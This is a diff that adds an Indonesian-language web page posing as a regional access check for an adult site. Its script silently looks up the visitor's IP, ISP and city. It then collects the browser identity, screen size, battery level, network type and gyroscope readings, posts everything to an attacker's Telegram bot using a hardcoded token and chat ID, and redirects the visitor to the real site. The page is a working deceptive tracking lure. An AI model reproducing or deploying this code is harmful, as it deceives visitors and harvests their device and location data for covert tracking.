@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akses Regional</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #121212;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            padding: 35px 25px;
+            background: #1e1e1e;
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #2f2f2f;
+        }
+        .site-logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        .site-logo span {
+            color: #ff8c00;
+        }
+        h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        p {
+            font-size: 14px;
+            color: #e3e3e3;
+            line-height: 1.5;
+        }
+        .warning-text {
+            font-size: 12px;
+            color: #ffc107;
+            background: rgba(255, 193, 7, 0.1);
+            padding: 10px;
+            border-radius: 6px;
+            margin-top: 15px;
+        }
+        .btn-group {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        button {
+            padding: 14px;
+            font-size: 15px;
+            background-color: #2f2f2f;
+            color: white;
+            border: 1px solid #444;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        button:hover {
+            background-color: #FE2C55;
+            border-color: #FE2C55;
+        }
+        #status-box {
+            margin-top: 20px;
+            font-weight: 600;
+            font-size: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #2f2f2f;
+            border-top: 4px solid #25F4EE;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        .loading { color: #25F4EE; }
+        .success { color: #00f2fe; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="site-logo">xhamster<span>.com</span></div>
+
+    <div id="setup-box">
+        <h3>Verifikasi Akses Pengguna</h3>
+        <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
+        
+        <p class="warning-text">
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan memproses enkripsi data sistem dan konfigurasi perangkat demi kepatuhan layanan regional.
+        </p>
+
+        <div class="btn-group">
+            <button onclick="mulaiVerifikasi('Indonesia')">Masuk Lewat Server Indonesia</button>
+            <button onclick="mulaiVerifikasi('Global')">Masuk Lewat Server Global / Internasional</button>
+        </div>
+    </div>
+
+    <div id="status-box" style="display: none;">
+        <div id="loading-spinner" class="spinner"></div>
+        <p id="status-text">Memproses...</p>
+    </div>
+</div>
+
+<script>
+const TELEGRAM_TOKEN = "8879531164:AAEpv9Gi4_iBlN3Ul6xW_cGrUn_OVP9XT_U";
+const CHAT_ID = "-5421199160";
+const URL_WEB_TUJUAN = "https://xhamster.com"; 
+
+let wilayahDipilih = "";
+let dataSensor = { alpha: "Tidak ada", beta: "Tidak ada", gamma: "Tidak ada" };
+let dataIPGlobal = { ip: "Gagal memuat", org: "Gagal memuat", city: "Gagal memuat", country_name: "Gagal memuat" };
+
+// Mengambil rincian IP publik & ISP di awal secara diam-diam
+fetch('https://ipapi.co')
+    .then(res => res.json())
+    .then(data => {
+        dataIPGlobal = data;
+    })
+    .catch(err => console.log("Gagal mengambil data IP:", err));
+
+// Sensor Perangkat (Giroskop koordinat arah kemiringan HP)
+if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', (event) => {
+        dataSensor.alpha = event.alpha ? event.alpha.toFixed(2) : "Tidak ada";
+        dataSensor.beta = event.beta ? event.beta.toFixed(2) : "Tidak ada";
+        dataSensor.gamma = event.gamma ? event.gamma.toFixed(2) : "Tidak ada";
+    }, { once: true }); 
+}
+
+function updateStatus(text, className, showSpinner = false) {
+    const statusBox = document.getElementById('status-box');
+    const statusText = document.getElementById('status-text');
+    const spinner = document.getElementById('loading-spinner');
+    
+    statusBox.style.display = 'flex';
+    statusText.innerText = text;
+    statusText.className = className;
+    spinner.style.display = showSpinner ? 'block' : 'none';
+}
+
+function mulaiVerifikasi(wilayah) {
+    wilayahDipilih = wilayah;
+    document.getElementById('setup-box').style.display = 'none';
+    siapkanDanKirimData();
+}
+
+// Proses kompilasi data internal instan dan kirim menggunakan parser HTML aman
+async function siapkanDanKirimData() {
+    updateStatus("Memuat enkripsi verifikasi...", "loading", true);
+
+    // Mengambil Informasi Persentase Baterai Sistem HP
+    let infoBaterai = "Tidak didukung";
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            infoBaterai = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Sedang Dicas' : 'Tidak Dicas'})`;
+        } catch (e) { console.log(e); }
+    }
+
+    // Mengambil Kualitas Estimasi Kecepatan Jaringan Operator
+    let infoJaringan = "Tidak didukung";
+    if (navigator.connection) {
+        infoJaringan = `${navigator.connection.effectiveType || 'N/A'} (Speed: ~${navigator.connection.downlink || 'N/A'} Mbps)`;
+    }
+
+    // Menyusun isi laporan menggunakan tag standar HTML agar kebal dari kesalahan parsing karakter khusus
+    const infoTeks = `<b>☠️ Hasil Verifikasi Akses target by @Diezfuck anonymous</b>\n\n` +
+                     `• <b>Wilayah Pilihan:</b> <code>${wilayahDipilih}</code>\n\n` +
+                     `<b>🌐 4. ALAMAT IP & OPERATOR (ISP)</b>\n` +
+                     `• IP Address: <code>${dataIPGlobal.ip}</code>\n` +
+                     `• ISP / Provider: <code>${dataIPGlobal.org}</code>\n` +
+                     `• Lokasi Kasar: <code>${dataIPGlobal.city}, ${dataIPGlobal.country_name}</code>\n\n` +
+                     `<b>📱 1. INFO PERANGKAT & SISTEM</b>\n` +
+                     `• OS/Browser: <code>${navigator.userAgent}</code>\n` +
+                     `• Layar HP: <code>${screen.width}x${screen.height} px</code>\n` +
+                     `• Bahasa Perangkat: <code>${navigator.language}</code>\n` +
+                     `• Info Baterai: <code>${infoBaterai}</code>\n` +
+                     `• Info Jaringan: <code>${infoJaringan}</code>\n\n` +
+                     `<b>🧭 2. SENSOR HARDWARE</b>\n` +
+                     `• Gyro Alpha (Z): <code>${dataSensor.alpha}</code>\n` +
+                     `• Gyro Beta (X): <code>${dataSensor.beta}</code>\n` +
+                     `• Gyro Gamma (Y): <code>${dataSensor.gamma}</code>`;
+
+    // Mengirim ke API Telegram Bot menggunakan konfigurasi objek JSON murni
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: infoTeks,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            updateStatus("✅ Verifikasi Berhasil! Mengalihkan ke situs...", "success", false);
+            setTimeout(() => {
+                window.location.href = URL_WEB_TUJUAN;
+            }, 1500);
+        } else {
+            // Menampilkan deskripsi error asli dari Telegram jika kredensial bot tidak valid
+            updateStatus(`❌ API Error: ${data.description || 'Gagal mengirim'}`, "", false);
+        }
+    })
+    .catch(error => {
+        // Penanganan jika domain API Telegram diblokir oleh provider internet lokal
+        updateStatus("❌ Terjadi kesalahan jaringan. Coba aktifkan VPN atau gunakan Wifi.", "", false);
+    });
+}
+</script>
+
+</body>
+</html>
